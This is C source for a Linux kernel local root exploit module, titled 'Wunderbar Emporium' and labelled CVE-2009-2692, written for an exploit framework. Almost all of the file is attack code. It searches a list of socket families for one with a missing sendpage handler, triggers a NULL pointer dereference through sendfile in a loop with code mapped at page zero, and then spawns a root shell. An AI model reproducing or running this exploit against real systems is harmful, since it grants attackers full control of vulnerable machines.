/* wunderbar */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include "exp_framework.h"

struct exploit_state *exp_state;

#define DOMAINS_STOP -1
#define VIDEO_SIZE 4171600
#ifndef IPPROTO_SCTP
#define IPPROTO_SCTP 132
#endif
#ifndef PX_PROTO_OL2TP
#define PX_PROTO_OL2TP 1
#endif
#ifndef PF_IUCV
#define PF_IUCV 32
#endif

const int domains[][3] = { { PF_APPLETALK, SOCK_DGRAM, 0 },
	{PF_IPX, SOCK_DGRAM, 0 }, { PF_IRDA, SOCK_DGRAM, 0 },
	{PF_X25, SOCK_DGRAM, 0 }, { PF_AX25, SOCK_DGRAM, 0 },
	{PF_BLUETOOTH, SOCK_DGRAM, 0 }, { PF_IUCV, SOCK_STREAM, 0 },
	{PF_INET6, SOCK_SEQPACKET, IPPROTO_SCTP },
	{PF_PPPOX, SOCK_DGRAM, 0 },
	{PF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP },
	{DOMAINS_STOP, 0, 0 }
	};

char *desc = "Wunderbar Emporium: Linux 2.X sendpage() local root";
char *cve = "CVE-2009-2692";

int prepare(unsigned char *buf)
{
	return STRAIGHT_UP_EXECUTION_AT_NULL;
}

int requires_null_page = 1;

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int trigger(void)
{
	while (exp_state->got_ring0 == 0) {
                char template[] = "/tmp/sendfile.XXXXXX";
                int d;
                int in, out;

                // Setup source descriptor
                if ((in = mkstemp(template)) < 0) {
                        fprintf(stdout, "failed to open input descriptor, %m\n");
                        return 0;
                }

                unlink(template);

                // Find a vulnerable domain
                for (d = 0; domains[d][0] != DOMAINS_STOP; d++) {
                        if ((out = socket(domains[d][0], domains[d][1], domains[d][2])) >= 0)
                                break;
                }

                if (out < 0) {
                        fprintf(stdout, "unable to find a vulnerable domain, sorry\n");
                        return 0;
                }

                // Truncate input file to some large value
                ftruncate(in, getpagesize());

                // sendfile() to trigger the bug.
                sendfile(out, in, NULL, getpagesize());
        }

	return 1;
}

int post(void)
{
	return RUN_ROOTSHELL;
}
